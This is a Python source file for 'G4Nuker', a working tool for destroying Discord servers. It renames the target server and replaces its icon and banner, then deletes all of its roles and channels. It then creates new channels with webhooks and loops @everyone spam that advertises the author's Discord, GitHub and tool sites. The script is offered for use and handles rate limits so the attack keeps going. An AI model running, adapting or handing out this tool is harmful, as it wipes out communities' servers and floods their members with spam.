import os
import re
import requests
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor
import sys

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

class co:
    g1 = [80, 5, 255]
    g2 = [200, 20, 90]

    main = rgb(80, 5, 255)
    red = rgb(255, 69, 0)
    darkred = rgb(139, 0, 0)
    green = rgb(50, 205, 50)
    blue = rgb(30, 144, 255)
    yellow = rgb(255, 215, 0)
    orange = rgb(255, 140, 0)
    deeporange = rgb(204, 85, 0)
    pink = rgb(255, 105, 180)
    cyan = rgb(0, 255, 255)
    magenta = rgb(255, 0, 255)
    lime = rgb(124, 252, 0)
    teal = rgb(64, 224, 208)
    indigo = rgb(138, 43, 226)
    violet = rgb(238, 130, 238)
    brown = rgb(139, 69, 19)
    grey = rgb(169, 169, 169)
    black = rgb(0, 0, 0)
    white = rgb(255, 255, 255)

    success = rgb(50, 205, 50)  
    error = rgb(255, 69, 0)    
    warning = rgb(255, 215, 0)       
    info = '\033[0m'              
    debug = rgb(169, 169, 169) 
    ratelimited = rgb(255, 215, 0)

    reset = '\033[0m'

class console:
    INFO = 'INFO'
    SUCCESS = 'SUCCESS'
    RATELIMITED = 'RATELIMITED'
    WARNING = 'WARNING'
    ERROR = 'ERROR'
   
    def __init__(self, module='Logging'):
        self.module = module
        self.levelcolors = {
            self.INFO: co.info,
            self.SUCCESS: co.success,
            self.RATELIMITED: co.ratelimited,   
            self.WARNING: co.warning,
            self.ERROR: co.error,
        }
   
    def log(self, level=INFO, text='No text provided', extra=''):
        watermark = ''
        color = self.levelcolors.get(level, co.main)
        extras = self.buildextras(level, extra)
        if level != console.INFO:
            levelprint = f'{color}[{level}]'
        else:
            levelprint = f'{co.main}[{co.reset}{level}{co.main}]'
        print(f'{watermark}{co.main}[{co.reset}{self.module}{co.main}] {levelprint} {co.reset}»{co.reset} {co.main}[{color}{text}{co.main}]{extras}{co.reset}')
   
    def buildextras(self, level, extra):
        if level == self.ERROR and extra:
            return f' {co.error}[{co.error}{extra}{co.error}]{co.reset}'
       
        elif extra:
            color = self.levelcolors.get(level, co.main)
            return f' {co.main}[{color}{extra}{co.main}]'
        return ''

    def cls(self):
        os.system('cls')

    def title(self, title):
        os.system(f'title {title}')

    def center(self, text, size):
        text = str(text)
        lines = text.split('\n')
        centeredlines = []
        for line in lines:
            visibleline = re.sub(r'\033\[[0-9;]*m', '', line)
            visiblelength = len(visibleline)
            
            if visiblelength >= size:
                centeredlines.append(line)
            else:
                padding = (size - visiblelength) // 2
                centeredlines.append(' ' * padding + line)
        
        return '\n'.join(centeredlines)

    def printbar(self, tokens, proxies):
        bar = fr'{co.main}«{tokens}» Tokens                   «{proxies}» Proxies'

        bar = self.center(text=bar, size=os.get_terminal_size().columns)
        bar = str(bar)

        for char in ['»', '«']:
            bar = bar.replace(char, f'{co.main}{char}{co.reset}')

        print(bar)

    def printbanner(self):
        banner = fr'''{co.main}
   ________ __  _   __      __            
  / ____/ // / / | / /_  __/ /_____  _____
 / / __/ // /_/  |/ / / / / //_/ _ \/ ___/
/ /_/ /__  __/ /|  / /_/ / ,< /  __/ /    
\____/  /_/ /_/ |_/\__,_/_/|_|\___/_/     ''' 
        banner = self.center(banner, os.get_terminal_size().columns)

        print(banner)

    def input(self, text, expected=str, default=None, choices=None, min_val=None, max_val=None):
        module = f'{co.main}[{co.reset}{self.module}{co.main}] ' if self.module else ''
        watermark = ''
        
        promptparts = [f'{watermark}{module}{co.main}[{co.reset}{text}{co.main}]']
        
        if expected == bool:
            promptparts.append(f'{co.main}({co.reset}{co.green}y{co.reset}/{co.red}n{co.reset}{co.main})')

        elif choices:
            choice_str = '/'.join(str(c) for c in choices)
            promptparts.append(f'{co.main}({co.reset}{choice_str}{co.main})')

        elif expected == int:
            if min_val is not None and max_val is not None:
                promptparts.append(f'{co.main}({co.reset}{min_val}-{max_val}{co.main})')

            elif min_val is not None:
                promptparts.append(f'{co.main}({co.reset}min {min_val}{co.main})')

            elif max_val is not None:
                promptparts.append(f'{co.main}({co.reset}max {max_val}{co.main})')
        
        if default is not None:
            promptparts.append(f'{co.main}[{co.reset}default {default}{co.main}]')
        
        prompt = ' '.join(promptparts) + f' {co.reset}» {co.reset}'
        
        while True:
            result = input(prompt).strip()
            
            if not result and default is not None:
                return default
            
            if not result:
                if expected == str:
                    return result
                else:
                    self.log(console.INFO, f'Input required please enter a value')
                    continue

            if expected == bool:
                if result.lower() in ['y', 'yes', 'true', '1']:
                    return True
                elif result.lower() in ['n', 'no', 'false', '0']:
                    return False
                else:
                    self.log(console.INFO, f'Please enter y/yes/true or n/no/false')
                    continue
            
            if expected == str:
                if choices and result not in choices:
                    choice_str = ', '.join(f'"{c}"' for c in choices)
                    self.log(console.INFO, f'Please choose from {choice_str}')
                    continue
                return result
            
            try:
                converted = expected(result)
                if expected in [int, float]:
                    if min_val is not None and converted < min_val:
                        self.log(console.INFO, f'Value must be at least {min_val}')
                        continue

                    if max_val is not None and converted > max_val:
                        self.log(console.INFO, f'Value must be no more than {max_val}')
                        continue
                
                if choices and converted not in choices:
                    choice_str = ', '.join(str(c) for c in choices)
                    self.log(console.INFO, f'Please choose from {choice_str}')
                    continue
                
                return converted
                
            except ValueError:
                if expected == int:
                    self.log(console.INFO, f'Please enter a whole number (eg 1 42 100)')

                elif expected == float:
                    self.log(console.INFO, f'Please enter a decimal number (eg 1.5 3.14 10.0)',)

                else:
                    self.log(console.INFO, f'Invalid format expected {expected.__name__}')
                continue

    def prep(self):
        self.cls()
        self.printbanner()
        if self.module != None:
            self.title(f'G4Spam - {self.module} - g4tools.top - discord.gg/spamming - Made by r3ci')

    def createmenu(self, options):
        toprint = []
        for i, option in enumerate(options, 1):
            number = str(i).zfill(2)
            toprint.append(f'{co.main}[{co.reset}{number}{co.main}] » {co.main}[{co.reset}{option}{co.main}]')
        
        print('\n'.join(toprint))

    def printcustommenu(self, options):
        options = dict(options)
        self.prep()
        self.createmenu(list(options.keys()) + ['Back'])
console=console('G4Nuker')

class G4nuker:
    def __init__(self, token):
        self.token = token
        self.clientid = None
        self.servers = []
        self.channels = []
        self.roles = []
        self.serverid = None
        self.webhooks = []
        self.channelscreated = []
        self.getclientid()

    def getclientid(self):
        while True:
            try:
                r = requests.get(
                    'https://discord.com/api/v9/oauth2/applications/@me',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    data = r.json()
                    self.clientid = data['id']
                    break
                
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting client ID')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get client ID error={r.text}')
                    self.clientid = console.input('Client ID', str)
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error getting client ID error={e}')
                self.clientid = console.input('Client ID', str)
                break

    def generateinvite(self):
        return f'https://discord.com/api/oauth2/authorize?client_id={self.clientid}&permissions=8&scope=bot'

    def getservers(self):
        while True:
            try:
                r = requests.get(
                    'https://discord.com/api/v10/users/@me/guilds',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    perms_map = {
                        1 << 1: 'Kick Members',
                        1 << 2: 'Ban Members',
                        1 << 3: 'Administrator',
                        1 << 4: 'Manage Channels',
                        1 << 5: 'Manage Guild',
                        1 << 13: 'Manage Messages',
                        1 << 28: 'Manage Roles',
                        1 << 29: 'Manage Webhooks',
                        1 << 30: 'Manage Emojis & Stickers',
                        1 << 26: 'Change Nickname',
                        1 << 27: 'Manage Nicknames',
                        1 << 40: 'Moderate Members'
                    }
                    def decodeperms(perm):
                        if perm & (1 << 3):
                            return ['Admin']
                        return [name for bit, name in perms_map.items() if perm & bit]
                    
                    result = []
                    for server in r.json():
                        perms = decodeperms(int(server['permissions']))
                        result.append({
                            'id': server['id'],
                            'name': server['name'],
                            'permissions': perms if perms else ['No Permissions']
                        })

                    self.servers = result
                    return result
                
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting servers')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get servers error={r.text}')
                    self.serverid = console.input('Server ID', str)
                    return 'skip'
                
            except Exception as e:
                console.log(console.ERROR, f'Error getting servers error={e}')
                self.serverid = console.input('Server ID', str)
                return 'skip'

    def isinserver(self):
        while True:
            try:
                r = requests.get(
                    'https://discord.com/api/v9/users/@me/guilds',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    for server in r.json():
                        if server['id'] == self.serverid:
                            return True, server['name']
                    return False, None
                
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while checking server membership')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to check server membership error={r.text}')
                    return True, ''
                
            except Exception as e:
                console.log(console.ERROR, f'Error checking server membership error={e}')
                return True, ''

    def getchannels(self):
        while True:
            try:
                r = requests.get(
                    f'https://discord.com/api/v9/guilds/{self.serverid}/channels',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    channels = []
                    for ch in r.json():
                        channels.append({
                            'id': ch['id'],
                            'name': ch['name'],
                            'type': ch['type']
                        })
                    self.channels = channels
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting channels')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get channels error={r.text}')
                    self.channels = []
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error getting channels error={e}')
                self.channels = []
                break

    def deletechannels(self):
        for channel in self.channels[:]:
            self.channels.remove(channel)
            name = channel['name']
            type = channel['type']
            channelid = channel['id']
            while True:
                try:
                    r = requests.delete(
                        f'https://discord.com/api/v9/channels/{channelid}',
                        headers={'Authorization': f'Bot {self.token}'}
                    )
                    if r.status_code in (200, 204):
                        console.log(console.SUCCESS, f'Deleted name={name} type={type}')
                        break

                    elif r.status_code == 429:
                        retry = r.json().get('retry_after', 1)
                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting name={name} type={type}')
                        time.sleep(retry)

                    else:
                        console.log(console.ERROR, f'Failed to delete name={name} type={type} error={r.text}')
                        break

                except Exception as e:
                    console.log(console.ERROR, f'Error deleting name={name} type={type} error={e}')
                    break

    def getroles(self):
        while True:
            try:
                r = requests.get(
                    f'https://discord.com/api/v9/guilds/{self.serverid}/roles',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    roles = []
                    for role in r.json():
                        roles.append({'id': role['id'], 'name': role['name']})
                    self.roles = roles
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting roles')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get roles error={r.text}')
                    self.roles = []
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error getting roles error={e}')
                self.roles = []
                break

    def deleteroles(self):
        for role in self.roles[:]:
            self.roles.remove(role)
            name = role['name']
            roleid = role['id']
            while True:
                try:
                    r = requests.delete(
                        f'https://discord.com/api/v9/guilds/{self.serverid}/roles/{roleid}',
                        headers={'Authorization': f'Bot {self.token}'}
                    )
                    if r.status_code in (200, 204):
                        console.log(console.SUCCESS, f'Deleted role name={name}')
                        break

                    elif r.status_code == 429:
                        retry = r.json().get('retry_after', 1)
                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting role name={name}')
                        time.sleep(retry)

                    else:
                        console.log(console.ERROR, f'Failed to delete role name={name} error={r.text}')
                        break

                except Exception as e:
                    console.log(console.ERROR, f'Error deleting role name={name} error={e}')
                    break

    def changeserverinfo(self):
        newname = 'github.com/r3ci/g4nuker'
        iconurl = 'https://i.imgur.com/dovl3R3.png'
        bannerurl = 'https://i.imgur.com/J35ZYZk.pngs'

        def encodeimage(url):
            r = requests.get(url)
            if r.status_code == 200:
                return 'data:image/png;base64,' + base64.b64encode(r.content).decode()
            return None

        payload = {'name': newname}
        payload['icon'] = encodeimage(iconurl) if iconurl else None
        payload['banner'] = encodeimage(bannerurl) if bannerurl else None

        while True:
            try:
                r = requests.patch(
                    f'https://discord.com/api/v9/guilds/{self.serverid}',
                    headers={
                        'Authorization': f'Bot {self.token}',
                        'Content-Type': 'application/json'
                    },
                    json=payload
                )
                if r.status_code == 200:
                    console.log(console.SUCCESS, 'Server info updated')
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while updating server info')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to update server info error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error updating server info error={e}')
                break

    def createchannels(self, _):
        while len(self.channelscreated) < 10:
            try:
                r = requests.post(
                    f'https://discord.com/api/v9/guilds/{self.serverid}/channels',
                    headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
                    json={'name': 'discord-gg-spamming', 'type': 0}
                )
                if r.status_code == 201:
                    ch = r.json()
                    self.channelscreated.append({'id': ch['id'], 'name': ch['name'], 'type': ch['type']})
                    self.channels.append({'id': ch['id'], 'name': ch['name'], 'type': ch['type']})
                    console.log(console.SUCCESS, f'Created channel name=discord-gg-spamming')

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while creating channels')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to create channel error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error creating channel error={e}')
                break

    def createwebhooks(self, channel):
        while True:
            try:
                r = requests.post(
                    f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks',
                    headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
                    json={'name': 'github.com/r3ci/g4nuker'}
                )
                if r.status_code == 200 or r.status_code == 201:
                    hook = r.json()
                    self.webhooks.append({'id': hook['id'], 'token': hook['token'], 'channel_id': channel['id']})
                    console.log(console.SUCCESS, f'Created webhook channel_id={channel["id"]}')
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while creating webhook channel_id={channel["id"]}')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to create webhook channel_id={channel["id"]} error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error creating webhook channel_id={channel["id"]} error={e}')
                break

    def spamwebhook(self, hook):
        while True:
            try:
                r = requests.post(
                    f'https://discord.com/api/v9/webhooks/{hook["id"]}/{hook["token"]}',
                    json={'content': '''
@everyone 
# https://has.cash/r3ci 
# https://github.com/r3ci/g4nuker
# https://discord.gg/spamming
# https://g4tools.top     
https://media.discordapp.net/attachments/1336489247229608007/1346253810456330270/caption.gif?ex=689090d0&is=688f3f50&hm=582875dd73b0bd6494d3bfc0e7c281d7fe7de555b8fe5ca7a4ea4a8b5b126eb2&format=webp&animated=true
https://media.discordapp.net/attachments/1106849767029477429/1114248605952397363/Zrzut_ekranu_2023-06-02_194601.gif?ex=68904921&is=688ef7a1&hm=23f231d77cd45d48d71ef30c0661e51b7bb954d8dd0b1a5327f752543dc0dd9c&=
'''}
                )
                if r.status_code in (200, 204):
                    pass

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited {retry}s while spamming webhook id={hook["id"]}')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to spam webhook id={hook["id"]} error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error spamming webhook id={hook["id"]} error={e}')
                break

while True:
    console.cls()
    console.title('G4Nuker - g4tools.top - discord.gg/spamming - Made by r3ci')
    console.printbanner()
    console.log(console.INFO, 'Made by r3ci, make sure to start the github repository!')
    console.log(console.INFO, 'g4tools.top | discord.gg/spamming | github.com/r3ci')
    token = console.input('Bot Token', str)
    g4nuker = G4nuker(token)

    invitelink = g4nuker.generateinvite()
    console.log(console.INFO, f'Bot invite link » {invitelink}')

    servers = g4nuker.getservers()
    if servers != 'skip':
        if not servers:
            console.log(console.ERROR, 'The bot is NOT in any servers! Pleas add it using the bot link provided and run again')
            input('')
            sys.exit()

        for server in servers:
            print('')
            console.log(console.INFO, f'ID » {server["id"]}')
            console.log(console.INFO, f'Name » {server["name"]}')
            console.log(console.INFO, f'Permissions » {", ".join(server["permissions"])}')
        g4nuker.serverid = console.input('Server ID', str)

    print('')
    inserver, servername = g4nuker.isinserver()
    while not inserver:
        console.log(console.INFO, 'The bot is NOT inside of the server! Add it using this link')
        console.log(console.INFO, f'Bot invite link » {invitelink}')
        console.log(console.INFO, 'Enter to continue')
        input('')
        inserver, servername = g4nuker.isinserver()

    console.log(console.INFO, f'Ready to nuke {servername}!')
    console.log(console.INFO, 'Enter to start nuking')
    input('')

    g4nuker.changeserverinfo()

    g4nuker.getroles()
    console.log(console.INFO, f'Found {len(g4nuker.roles)} roles, deleting them now!')
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(lambda _: g4nuker.deleteroles(), range(len(g4nuker.roles)))

    g4nuker.getchannels()
    console.log(console.INFO, f'Found {len(g4nuker.channels)} channels, deleting them now!')
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(lambda _: g4nuker.deletechannels(), range(len(g4nuker.channels)))

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(g4nuker.createchannels, range(10))
    console.log(console.INFO, f'Created {len(g4nuker.channels)} channels')

    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(g4nuker.createwebhooks, g4nuker.channels)
    console.log(console.INFO, f'Created {len(g4nuker.webhooks)} webhooks')

    with ThreadPoolExecutor(max_workers=len(g4nuker.webhooks)) as executor:
        executor.map(g4nuker.spamwebhook, g4nuker.webhooks)

    console.log(console.INFO, 'Finished! Enter to continue')
    input('')
